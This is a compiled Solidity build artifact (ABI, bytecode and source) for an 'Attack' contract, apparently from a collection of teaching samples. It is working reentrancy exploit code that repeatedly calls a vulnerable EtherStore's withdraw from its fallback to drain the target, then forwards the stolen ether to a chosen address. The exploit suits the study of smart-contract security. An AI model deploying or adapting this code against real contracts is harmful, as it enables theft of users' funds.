{
  "contractName": "Attack",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_etherStoreAddress",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "inputs": [],
      "name": "etherStore",
      "outputs": [
        {
          "internalType": "contract EtherStore",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "getBalance",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address payable",
          "name": "addressToSend",
          "type": "address"
        }
      ],
      "name": "transferToaddress",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b5060405161065d38038061065d833981810160405281019061003291906100db565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610108565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006100a88261007d565b9050919050565b6100b88161009d565b81146100c357600080fd5b50565b6000815190506100d5816100af565b92915050565b6000602082840312156100f1576100f0610078565b5b60006100ff848285016100c6565b91505092915050565b610546806101176000396000f3fe6080604052600436106100435760003560e01c806312065fe01461010d5780635ad8e8ae146101385780639e5faafc14610154578063acd2e6e51461015e57610044565b5b670de0b6b3a764000060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16311061010b5760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156100f257600080fd5b505af1158015610106573d6000803e3d6000fd5b505050505b005b34801561011957600080fd5b50610122610189565b60405161012f919061036e565b60405180910390f35b610152600480360381019061014d91906103ec565b610191565b005b61015c6101db565b005b34801561016a57600080fd5b50610173610331565b6040516101809190610478565b60405180910390f35b600047905090565b8073ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f193505050501580156101d7573d6000803e3d6000fd5b5050565b670de0b6b3a7640000341015610226576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161021d906104f0565b60405180910390fd5b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0670de0b6b3a76400006040518263ffffffff1660e01b81526004016000604051808303818588803b15801561029657600080fd5b505af11580156102aa573d6000803e3d6000fd5b505050505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561031757600080fd5b505af115801561032b573d6000803e3d6000fd5b50505050565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6000819050919050565b61036881610355565b82525050565b6000602082019050610383600083018461035f565b92915050565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006103b98261038e565b9050919050565b6103c9816103ae565b81146103d457600080fd5b50565b6000813590506103e6816103c0565b92915050565b60006020828403121561040257610401610389565b5b6000610410848285016103d7565b91505092915050565b6000819050919050565b600061043e6104396104348461038e565b610419565b61038e565b9050919050565b600061045082610423565b9050919050565b600061046282610445565b9050919050565b61047281610457565b82525050565b600060208201905061048d6000830184610469565b92915050565b600082825260208201905092915050565b7f4d6f7265207468616e2031206574686572206e65656465640000000000000000600082015250565b60006104da601883610493565b91506104e5826104a4565b602082019050919050565b60006020820190508181036000830152610509816104cd565b905091905056fea2646970667358221220ade518f423e7e1d3cc8c61170d044e70e53831faf09c77057c00b664b5a4673664736f6c63430008090033",
  "immutableReferences": {},
  "source": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.3;\n\nimport \"./EtherStore.sol\";\n\ncontract Attack {\n    EtherStore public etherStore;\n\n    constructor(address _etherStoreAddress) {\n        etherStore = EtherStore(_etherStoreAddress);\n    }\n\n    // Fallback is called when EtherStore sends Ether to this contract.\n    fallback() external payable {\n        if (address(etherStore).balance >= 1 ether) {\n            etherStore.withdraw();\n        }\n    }\n\n    function attack() external payable {\n        require(msg.value >= 1 ether, \"More than 1 ether needed\");\n        etherStore.deposit{value: 1 ether}();\n        etherStore.withdraw();\n    }\n\n    // Helper function to check the balance of this contract\n    function getBalance() public view returns (uint256) {\n        return address(this).balance;\n    }\n\n    function transferToaddress(address payable addressToSend) public payable {\n        addressToSend.transfer(address(this).balance);\n    }\n}\n",
  "sourcePath": "/home/zcluster55/Documents/Research/Solidity-Examples/contract-samples/contracts/Attack.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.9+commit.e5eed63a.Emscripten.clang"
  },
  "schemaVersion": "3.4.3",
  "updatedAt": "2021-10-26T05:57:55.830Z",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}